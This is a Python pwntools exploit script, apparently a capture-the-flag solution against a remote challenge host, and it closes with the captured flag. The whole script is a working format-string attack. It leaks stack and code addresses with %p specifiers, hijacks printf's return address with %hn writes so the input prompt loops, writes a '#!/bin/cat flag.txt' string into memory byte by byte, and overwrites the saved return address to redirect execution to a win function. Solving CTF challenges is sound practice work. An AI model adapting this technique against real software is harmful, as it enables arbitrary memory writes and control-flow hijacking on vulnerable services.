from pwn import *

e = ELF("./main")
context.binary = e

p_s = lambda data: p.send(data)
p_sa = lambda msg, data: p.sendafter(msg, data)
p_sl = lambda data: p.sendline(data)
p_sla = lambda msg, data: p.sendlineafter(msg, data)
p_recvut = lambda msg: p.recvuntil(msg)
debug = lambda : gdb.attach(p, gdbscript = script)

'''
fgets 2
printf 2
fgest 1
'''

script = '''
b *vuln
brva 0x1415
brva 0x1455
brva 0x139F
'''

def overwrite(addr, val, ret_addr):
	payload = f"%{val}c%10$hhn".encode()
	payload = payload.ljust(0x10, b"A")
	payload += p64(addr)
	p_sla(b"first name: ", payload)

	payload = f"%{0xd378}c%14$hn".encode()
	payload = payload.ljust(0x10, b"A")
	payload += p64(ret_addr)
	p_sla(b"Enter your last name: ", payload)

while(True):
	try:
		p = remote("challs.breachers.in", 1337)
		#p = process("./main")
		#p = gdb.debug("./main", gdbscript = script)

		# leak stack
		payload = b"%7$p"
		p_sla(b"first name: ", payload)
		p_recvut(b"You entered ")
		rbp = int(p.recvline(), 16) - 8
		print(hex(rbp))

		# overwrite printf return address -> make loop
		printf_ret_addr = rbp - 0x68
		payload = f"%{0xd3ee}c%14$hn".encode()
		payload = payload.ljust(0x10, b"A")
		payload += p64(printf_ret_addr)
		p_sla(b"Enter your last name: ", payload)
		p_recvut(b"Enter your last name: ")
	
		# leak code base and make loop to the first fmt str
		printf_ret_addr = rbp - 0x68
		payload = f"%19${0xd378}p%14$hn".encode()
		payload = payload.ljust(0x10, b"A")
		payload += p64(printf_ret_addr)
		p_sl(payload)
		p_recvut(b"0x")
		code_base = int(b"0x" + p.recv(12), 16) - 0x14b5
		print(hex(code_base))
		
		# overwrite buffer -> "#!/bin/cat flag.txt"
		arr = [0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x63, 0x61, 0x74, 0x20, 0x66, 0x6c, 0x61, 0x67, 0x2e, 0x74, 0x78, 0x74]
		buffer = code_base + 0x4040
		for i in range(len(arr)):
			overwrite(buffer + i, arr[i], printf_ret_addr)

		# overwrite saved rip of vuln -> win
		win = code_base + e.symbols['win']
		arr = []
		for i in range(6):
			arr.append(win & 0xff)
			win = win >> 8
		for i in range(len(arr)):
			overwrite(rbp + 0x8 + i, arr[i], printf_ret_addr)

		# trigger to win
		#debug()
		p_sla(b"first name: ", b"A")
		p_sla(b"Enter your last name: ", b"B")

		break
	except:
		try:
			p.close()
		except:
			pass

p.interactive()
#Breach{5h0uldv3_l1573n3d_70_7h3_6cc_w4rn1n65}